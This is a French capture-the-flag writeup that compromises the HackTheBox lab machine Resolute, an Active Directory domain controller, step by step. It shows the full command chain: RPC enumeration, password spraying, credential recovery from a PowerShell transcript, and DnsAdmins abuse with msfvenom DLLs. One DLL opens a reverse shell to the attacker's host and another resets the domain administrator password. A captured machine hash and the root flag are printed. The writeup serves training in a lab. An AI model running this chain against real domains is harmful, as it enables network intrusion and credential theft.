---
title: Resolute - HacktheBox(Medium)
date: 2024-03-10 00:00:00 -500
categories: [Hacking for Beginners, HacktheBox]
tags: [CVE, HTB, Medium, Hacking]
image:
    path: https://i.ibb.co/x2bNLDD/ar.jpg
---

Dans cet article, je vais presenter mon writeup sur la Box Resolute de HacktheBox, qui est vraiment une machine de Active Directory tres fascinant.
## Description
Resolute est une machine Windows de Niveau Medium et est dotée d'Active Directory. Un utilisateur anonyme Active Directory est utilisé pour obtenir un mot de passe que les administrateurs définissent pour les nouveaux comptes d'utilisateurs, bien qu'il semble que le mot de passe de ce compte ait changé depuis. Une recherche de mot de passe révèle que ce mot de passe est toujours utilisé pour un autre compte d'utilisateur du domaine, ce qui nous permet d'accéder au système via WinRM. Un journal de transcription PowerShell est découvert, qui a capturé les informations d'identification transmises sur la ligne de commande. Cela permet de se déplacer latéralement vers un utilisateur membre du `groupe DnsAdmins`. Ce groupe a la possibilité de spécifier que le service DNS Server charge un plugin DLL. Après avoir redémarré le service DNS, nous parvenons à exécuter une commande sur le contrôleur de domaine dans le contexte `NT_AUTHORITY\SYSTEM`.


- **The Best Academy to Learn Hacking is [Here](https://affiliate.hackthebox.com/nenandjabhata)**.
- **Beginner Friendly challenges on TryHackMe [Here](https://tryhackme.com/signup?referrer=61e8a27ddd3f3b00496505d1)**.


## Reconnaissance
Pour commender, je commence avec une petite recherche de nmap.

```terminal
─# /home/blo/tools/nmapautomate/nmapauto.sh $ip

###############################################
###---------) Starting Quick Scan (---------###
###############################################

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-08 19:38 CST
Initiating Ping Scan at 19:38
Scanning 10.129.96.155 [4 ports]
Completed Ping Scan at 19:38, 0.27s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 19:38
Completed Parallel DNS resolution of 1 host. at 19:38, 0.05s elapsed
Initiating SYN Stealth Scan at 19:38
Scanning 10.129.96.155 [1000 ports]
Discovered open port 135/tcp on 10.129.96.155
Discovered open port 139/tcp on 10.129.96.155
Discovered open port 53/tcp on 10.129.96.155
Discovered open port 445/tcp on 10.129.96.155
Discovered open port 88/tcp on 10.129.96.155
Discovered open port 3269/tcp on 10.129.96.155
Discovered open port 636/tcp on 10.129.96.155
Discovered open port 464/tcp on 10.129.96.155
Discovered open port 389/tcp on 10.129.96.155
Discovered open port 593/tcp on 10.129.96.155
Discovered open port 3268/tcp on 10.129.96.155
Completed SYN Stealth Scan at 19:38, 2.46s elapsed (1000 total ports)
Nmap scan report for 10.129.96.155
Host is up (0.27s latency).
Not shown: 989 closed tcp ports (reset)
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 2.95 seconds
           Raw packets sent: 1066 (46.880KB) | Rcvd: 1063 (42.564KB)


----------------------------------------------------------------------------------------------------------
Open Ports : 53,88,135,139,389,445,464,593,636,3268,3269                                                                                                                                     
----------------------------------------------------------------------------------------------------------                                                                                   
Nmap scan report for 10.129.96.155
Host is up (0.20s latency).
Not shown: 63516 closed tcp ports (reset), 1995 filtered tcp ports (no-response)
PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Simple DNS Plus
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2024-03-09 01:46:59Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds (workgroup: MEGABANK)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49670/tcp open  msrpc        Microsoft Windows RPC
49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc        Microsoft Windows RPC
49686/tcp open  msrpc        Microsoft Windows RPC
49711/tcp open  msrpc        Microsoft Windows RPC
49760/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 132.45 seconds
           Raw packets sent: 108280 (4.764MB) | Rcvd: 89739 (3.590MB)


----------------------------------------------------------------------------------------------------------
Open Ports : 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49670,49676,49677,49686,49711,49760                                                         
----------------------------------------------------------------------------------------------------------   
```

Avec ce script j'ai eu plusieurs ports ouverts, Un  second scan

```terminal
└─# nmap -sCV -Pn -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49670,49676,49677,49686,49711,49760 10.129.96.155
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-08 19:44 CST
Host is up (0.20s latency).

PORT      STATE  SERVICE      VERSION
53/tcp    open   domain       Simple DNS Plus
88/tcp    open   kerberos-sec Microsoft Windows Kerberos (server time: 2024-03-09 01:51:59Z)
135/tcp   open   msrpc        Microsoft Windows RPC
139/tcp   open   netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open   ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
445/tcp   open   microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK)
464/tcp   open   kpasswd5?
593/tcp   open   ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open   tcpwrapped
3268/tcp  open   ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
3269/tcp  open   tcpwrapped
5985/tcp  open   http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open   mc-nmf       .NET Message Framing
47001/tcp open   http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open   msrpc        Microsoft Windows RPC
49665/tcp open   msrpc        Microsoft Windows RPC
49666/tcp open   msrpc        Microsoft Windows RPC
49667/tcp open   msrpc        Microsoft Windows RPC
49670/tcp open   msrpc        Microsoft Windows RPC
49676/tcp open   ncacn_http   Microsoft Windows RPC over HTTP 1.0
49677/tcp open   msrpc        Microsoft Windows RPC
49686/tcp open   msrpc        Microsoft Windows RPC
49711/tcp open   msrpc        Microsoft Windows RPC
49760/tcp closed unknown
Service Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Resolute
|   NetBIOS computer name: RESOLUTE\x00
|   Domain name: megabank.local
|   Forest name: megabank.local
|   FQDN: Resolute.megabank.local
|_  System time: 2024-03-08T17:52:57-08:00
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-03-09T01:52:58
|_  start_date: 2024-03-09T01:42:53
|_clock-skew: mean: 2h47m05s, deviation: 4h37m10s, median: 7m03s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required

```

A travers ces resultats je trouve des choses importants : 

- Le domain `megabank.local`, le Domain Controller `Resolute.megabank.local`
- Le DNS au port 53
- Le Kerberoas au port 88
- Le SMB aux ports 139 et 145
- Le MSPRC au port 135
- Le winrm au port 5985

**Commencons par le SMB**

```
└─# nxc smb $ip -u '' -p '' --shares
SMB         10.129.96.155   445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
SMB         10.129.96.155   445    RESOLUTE         [+] megabank.local\: 
SMB         10.129.96.155   445    RESOLUTE         [-] Error enumerating shares: STATUS_ACCESS_DENIED
```

Ici je trouve un user anonyme mais je peux pas lister les shares, Alors...

**Allons vers le MSRPC**

```
└─# rpcclient -U '' -N 10.129.96.155
rpcclient $> enumdomains
name:[MEGABANK] idx:[0x0]
name:[Builtin] idx:[0x0]
rpcclient $> 
```
Good, je peux bien enumerer les domaines dans le `rpcclient`, Donc enumerons les informations des utilisateurs avec le `querydispinfo`

```terminal
rpcclient $> querydispinfo
index: 0x10b0 RID: 0x19ca acb: 0x00000010 Account: abigail      Name: (null)    Desc: (null)
index: 0xfbc RID: 0x1f4 acb: 0x00000210 Account: Administrator  Name: (null)    Desc: Built-in account for administering the computer/domain
index: 0x10b4 RID: 0x19ce acb: 0x00000010 Account: angela       Name: (null)    Desc: (null)
index: 0x10bc RID: 0x19d6 acb: 0x00000010 Account: annette      Name: (null)    Desc: (null)
index: 0x10bd RID: 0x19d7 acb: 0x00000010 Account: annika       Name: (null)    Desc: (null)
index: 0x10b9 RID: 0x19d3 acb: 0x00000010 Account: claire       Name: (null)    Desc: (null)
index: 0x10bf RID: 0x19d9 acb: 0x00000010 Account: claude       Name: (null)    Desc: (null)
index: 0xfbe RID: 0x1f7 acb: 0x00000215 Account: DefaultAccount Name: (null)    Desc: A user account managed by the system.
index: 0x10b5 RID: 0x19cf acb: 0x00000010 Account: felicia      Name: (null)    Desc: (null)
index: 0x10b3 RID: 0x19cd acb: 0x00000010 Account: fred Name: (null)    Desc: (null)
index: 0xfbd RID: 0x1f5 acb: 0x00000215 Account: Guest  Name: (null)    Desc: Built-in account for guest access to the computer/domain
index: 0x10b6 RID: 0x19d0 acb: 0x00000010 Account: gustavo      Name: (null)    Desc: (null)
index: 0xff4 RID: 0x1f6 acb: 0x00000011 Account: krbtgt Name: (null)    Desc: Key Distribution Center Service Account
index: 0x10b1 RID: 0x19cb acb: 0x00000010 Account: marcus       Name: (null)    Desc: (null)
index: 0x10a9 RID: 0x457 acb: 0x00000210 Account: marko Name: Marko Novak       Desc: Account created. Password set to Welcome123!
index: 0x10c0 RID: 0x2775 acb: 0x00000010 Account: melanie      Name: (null)    Desc: (null)
index: 0x10c3 RID: 0x2778 acb: 0x00000010 Account: naoki        Name: (null)    Desc: (null)
index: 0x10ba RID: 0x19d4 acb: 0x00000010 Account: paulo        Name: (null)    Desc: (null)
index: 0x10be RID: 0x19d8 acb: 0x00000010 Account: per  Name: (null)    Desc: (null)
index: 0x10a3 RID: 0x451 acb: 0x00000210 Account: ryan  Name: Ryan Bertrand     Desc: (null)
index: 0x10b2 RID: 0x19cc acb: 0x00000010 Account: sally        Name: (null)    Desc: (null)
index: 0x10c2 RID: 0x2777 acb: 0x00000010 Account: simon        Name: (null)    Desc: (null)
index: 0x10bb RID: 0x19d5 acb: 0x00000010 Account: steve        Name: (null)    Desc: (null)
index: 0x10b8 RID: 0x19d2 acb: 0x00000010 Account: stevie       Name: (null)    Desc: (null)
index: 0x10af RID: 0x19c9 acb: 0x00000010 Account: sunita       Name: (null)    Desc: (null)
index: 0x10b7 RID: 0x19d1 acb: 0x00000010 Account: ulf  Name: (null)    Desc: (null)
index: 0x10c1 RID: 0x2776 acb: 0x00000010 Account: zach Name: (null)    Desc: (null)
```

Avec toutes ces informations, jarrive a trouver un mot de passe `Welcome123!` de l'utilisateur `marko`. Mais en l'essayant elle marche pas avec cet utilisateur

```terminal
└─# nxc smb $ip -u 'marko' -p 'Welcome123!' --shares
SMB         10.129.96.155   445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\marko:Welcome123! STATUS_LOGON_FAILURE 
                                                
```

Alors quoi faire ? je vais enumerer toutes les utilisateurs du domaine et ensuite voir si ce mot de passe fonctionne avec un autre utilisateur grace au *PasswordSpraying*

```terminal
└─# rpcclient -U '' -N 10.129.96.155 -c 'enumdomusers' | grep -oP '\[.*?\]' | grep -v '0x'  | tr -d '[]' > res_user
Administrator
Guest
krbtgt
DefaultAccount
ryan
marko
sunita
abigail
marcus
sally
fred
angela
felicia
gustavo
ulf
stevie
claire
paulo
steve
annette
annika
per
claude
melanie
zach
simon
naoki
```


![nxc](https://i.ibb.co/qdxkgmF/pic1.png)

Avec `nxc` j'ai eu `melanie` comme etant valides avec le mot de passe que j'ai trouver. Donc Avec cet utilisateur je vais me connecter au `winrm` comme c'est deja ouvert pour voir.

![Hacked](https://i.ibb.co/tqx0tH0/pic2.png)


**Mouvement Lateral**
Pour faire un Mouvement Lateral a partir de cet utilisateur vers un autre utilisateur, je vais d'abord me rendre au repertoire `C:\`

```terminal
*Evil-WinRM* PS C:\> dir -force


    Directory: C:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d--hs-        12/3/2019   6:40 AM                $RECYCLE.BIN
d--hsl        9/25/2019  10:17 AM                Documents and Settings
d-----        9/25/2019   6:19 AM                PerfLogs
d-r---        9/25/2019  12:39 PM                Program Files
d-----       11/20/2016   6:36 PM                Program Files (x86)
d--h--        9/25/2019  10:48 AM                ProgramData
d--h--        12/3/2019   6:32 AM                PSTranscripts
d--hs-        9/25/2019  10:17 AM                Recovery
d--hs-        9/25/2019   6:25 AM                System Volume Information
d-r---        12/4/2019   2:46 AM                Users
d-----        12/4/2019   5:15 AM                Windows
-arhs-       11/20/2016   5:59 PM         389408 bootmgr
-a-hs-        7/16/2016   6:10 AM              1 BOOTNXT
-a-hs-         3/9/2024   7:49 PM      402653184 pagefile.sys
```

A partir de ceci je trouve un fichier cachee `PSTranscripts`

```terminal
*Evil-WinRM* PS C:\PSTranscripts> dir -force


    Directory: C:\PSTranscripts


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d--h--        12/3/2019   6:45 AM                20191203


*Evil-WinRM* PS C:\PSTranscripts\20191203> dir -force


    Directory: C:\PSTranscripts\20191203


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-arh--        12/3/2019   6:45 AM           3732 PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt


*Evil-WinRM* PS C:\PSTranscripts\20191203> 

```

Je trouve plusieurs fichiers cachee dans ce `PSTranscripts`, aussi un fichier `.txt` tres interessant. A l'interieur je trouve 
```terminal
At line:1 char:1
+ cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (The syntax of this command is::String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
```

Un utilisateur `ryan` et aussi un mot de passe `Serv3r4Admin4cc123!`

![Hacked](https://i.ibb.co/P6BwvMw/pic3.png)

(Pwn3d!), Mais est-ce que je suis vraiment Admin de la Box maintenant ?
- Pour verifier je vais utiliser `secretsdump` pour essayer d'extraire les secrets `NTDS.DIT`

```terminal
└─# impacket-secretsdump megabank.local/ryan:Serv3r4Admin4cc123\!@10.129.234.83
Impacket v0.12.0.dev1+20231114.165227.4b56c18a - Copyright 2023 Fortra

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
[-] DRSR SessionError: code: 0x20f7 - ERROR_DS_DRA_BAD_DN - The distinguished name specified for this replication operation is invalid.
[*] Something went wrong with the DRSUAPI approach. Try again with -use-vss parameter
[*] Cleaning up...
```

Ca ne marche pas

## Privilege Escalation
Avec cet utilisateur, je vais aussi me connecter au `winrm` pour voir si je pourrais escalader mes privileges.

```terminal
Evil-WinRM* PS C:\Users\ryan\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

Rien d'interessant dans les privileges, et si je verifiais les `groups`

```terminal
*Evil-WinRM* PS C:\Users\ryan\Documents> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                            Attributes
========================================== ================ ============================================== ===============================================================
Everyone                                   Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
MEGABANK\Contractors                       Group            S-1-5-21-1392959593-3013219662-3596683436-1103 Mandatory group, Enabled by default, Enabled group
MEGABANK\DnsAdmins                         Alias            S-1-5-21-1392959593-3013219662-3596683436-1101 Mandatory group, Enabled by default, Enabled group, Local Group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192
```

Cet utilisateur est membre du groupe `DnsAdmins`, pourrais-je avoir le root avec ca ?

En faisant quelque recherche, je trouve que Les membres du groupe `DNSAdmins` ont accès aux informations DNS du réseau. Les autorisations par défaut sont les suivantes : Lire, écriture, création de tous les objets enfants, suppression des objets enfants, autorisations spéciales.

Pour l'abuser alors je vais :
- Creer un DLL Malicieux pour avoir un shell
- ce DLL va s'executer par DNS et qui va ensuite me donner une connexion en tantque SYSTEM sur la machine victime dans le Controlleur de Domaine

```terminal
└─# msfvenom -p windows/x64/shell/reverse_tcp LHOST=10.10.14.16 LPORT=443 -f dll -o reverse.dll
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of dll file: 9216 bytes
Saved as: reverse.dll


```

Je cree un server smb local pour avoir le `dll` dans la machine victime lors de l'execution du DNS

```
─# impacket-smbserver s .
Impacket v0.12.0.dev1+20231114.165227.4b56c18a - Copyright 2023 Fortra

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```


```terminal
*Evil-WinRM* PS C:\Users\ryan\Desktop> dnscmd.exe /config /serverlevelplugindll \\10.10.14.16\s\reverse.dll

Registry property serverlevelplugindll successfully reset.
Command completed successfully.

*Evil-WinRM* PS C:\Users\ryan\Desktop> sc.exe \\resolute stop dns

SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 3  STOP_PENDING
                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
*Evil-WinRM* PS C:\Users\ryan\Desktop> sc.exe \\resolute start dns

SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 2852
        FLAGS              :
```

Dans ma reponse SMB j'ai

```
└─# impacket-smbserver s .
Impacket v0.12.0.dev1+20231114.165227.4b56c18a - Copyright 2023 Fortra

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.129.234.83,50891)
[*] AUTHENTICATE_MESSAGE (MEGABANK\RESOLUTE$,RESOLUTE)
[*] User RESOLUTE\RESOLUTE$ authenticated successfully
[*] RESOLUTE$::MEGABANK:aaaaaaaaaaaaaaaa:6f2aed880e3265f97f774d17cd91823e:010100000000000000fc2c55a672da01dd45ef7299b62027000000000100100068004d006e006e006300550075006f000300100068004d006e006e006300550075006f00020010006b006e00620050007100430042005700040010006b006e006200500071004300420057000700080000fc2c55a672da0106000400020000000800300030000000000000000000000000400000c918efa0e0a305f7ee9088bbb2d8395849cba59cec72e27efcf319ad41b3b4130a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00310036000000000000000000
[*] Disconnecting Share(1:IPC$)
```

Et si j'essayais de changer le mot de passe de l'administrateur avec un autre DLL?


```terminal
└─# msfvenom -p windows/x64/exec cmd='net user administrator Password1 /domain' -f dll > dn.dll 
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 308 bytes
Final size of dll file: 9216 bytes
```

Ensuite la meme methode, mais avec `cmd` cett fois

```terminal
*Evil-WinRM* PS C:\Users\ryan\Desktop> cmd /c dnscmd localhost /config /serverlevelplugindll \\10.10.14.16\s\dn.dll

Registry property serverlevelplugindll successfully reset.
Command completed successfully.

*Evil-WinRM* PS C:\Users\ryan\Desktop> sc.exe \\resolute stop dns

SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 3  STOP_PENDING
                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x1
        WAIT_HINT          : 0x7530
*Evil-WinRM* PS C:\Users\ryan\Desktop> sc.exe \\resolute start dns

SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 3064
        FLAGS              :
*Evil-WinRM* PS C:\Users\ryan\Desktop> 


```

Et voilaaa...


```terminal
└─# nxc smb 10.129.234.83 -u 'administrator' -p 'Password1' -x "type C:\users\administrator\desktop\root.txt" 
SMB         10.129.234.83   445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
SMB         10.129.234.83   445    RESOLUTE         [+] megabank.local\administrator:Password1 (Pwn3d!)
SMB         10.129.234.83   445    RESOLUTE         [+] Executed command via wmiexec
SMB         10.129.234.83   445    RESOLUTE         25b132f718f3601309fcf37847731331
                                                                                      
```

![Pwned](https://i.ibb.co/nrNc5ZG/pwned.png)



Merci d'avoir lu...

### Join Us
**Let's learn, explore, and hack together**. **Join us on Discord [here](https://discord.gg/wBT9wr9ruG)**.